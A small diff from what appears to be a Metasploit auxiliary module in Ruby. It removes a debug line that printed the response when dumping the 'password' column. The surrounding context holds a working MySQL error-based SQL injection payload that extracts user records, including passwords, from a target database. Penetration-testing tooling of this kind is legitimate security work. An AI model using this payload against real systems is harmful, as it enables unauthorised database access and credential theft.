@@ -107,7 +107,6 @@ class Metasploit4 < Msf::Auxiliary
             cols.each do |col|
               get_col = "AND (SELECT 7072 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),1,54) FROM #{db}.#{table} ORDER BY id LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
               res = sqli(get_col)
-              p res.body if col == "password"
               user[col] = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
             end
             users << user
